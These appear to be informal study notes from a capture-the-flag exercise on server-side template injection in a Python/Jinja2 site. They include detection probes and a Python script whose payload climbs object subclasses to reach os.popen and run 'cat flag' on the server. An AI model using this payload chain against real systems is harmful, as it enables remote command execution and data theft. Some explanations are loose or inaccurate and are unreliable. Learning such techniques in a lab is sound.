Template -  an xml or html coded file with dynamic content
dynamic content - content which is read from http parameters sent by the user
if dynamic content space not sanitized or test checked by dev, allows attacker to add in whatever input he wants to which has harms and could be dangerous

To read headers of http request or links:
curl -I \<link\>

A famous script to check for injection with:
\{\{7\*7\}\} -> 49
gives a diff output->shows inputs are not getting sanitiszed and validated, they get processed

import ls open doesnt work, so dont do + some servers arent runtime compatible with ts so just show a default error which doesnt help our case

from the curl, we could tell ts uses python, so type in `{{"".__class__}}`
gives output `<class 'str'>`

code is in the req.py folder on desktop, might change location, might not.

<h1>Summarizing ts in claude</h1>
do the necessary imports, in ts getting requests, html and re is important for winning hide and seek with the specific tag and injection

`payload= "{{\"\".__class__.__base__.__subclasses__()}}"`

The `{{}}` are special brackets that make the website think this is instructions, not regular text
`r= requests.post(url, data={"content":payload})`

this posts the payload into the website (injects ts into it)
`if r.status_code == 200:`  checks if it worked

`html_content = r.text
`content_decoded = html.unescape(html_content)
`class_names = re.findall(r"<class '([^']+)'>", content_decoded)`
This takes all the code of the site in html, converts it to normal text using unescape, then uses findall to get all the specific tags and shi

`new_paload = "{{\"\".__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__['sys'].modules['os'].popen('cat flag').read()}}"`
goes through every i'th class,
finds system tools,
executes 'cat flag' to search for the tag 'flag' in the class,
reads whats inside the class/tag

`nr = requests.post(url, data={"content":new_paload})
`if nr.status_code == 200:
    `print(nr.text)
    `print("*"*20)
    `print("class name: ", class_names[i], "index: ", i)
    `exit(0)
puts that specifc thing into the website, if it works successfully, prints whatever the output text was and then exits

<h3>Key takeaways</h3>
THis works because:
1. Canvassed the website with curl to know its based on python/jinjja2 templates that makes an idea of its behaviour clear
2. climbs through python dom family tree using the long `{{''.__class__.wtv}}`
3. `os.popen()`is what runs the `cat flag`command to locate the flag file
4. basically brute force enumeration: try every line in file, and then locate the key one then take it and injection it into file, then we get output

thats all,
`exit(0)`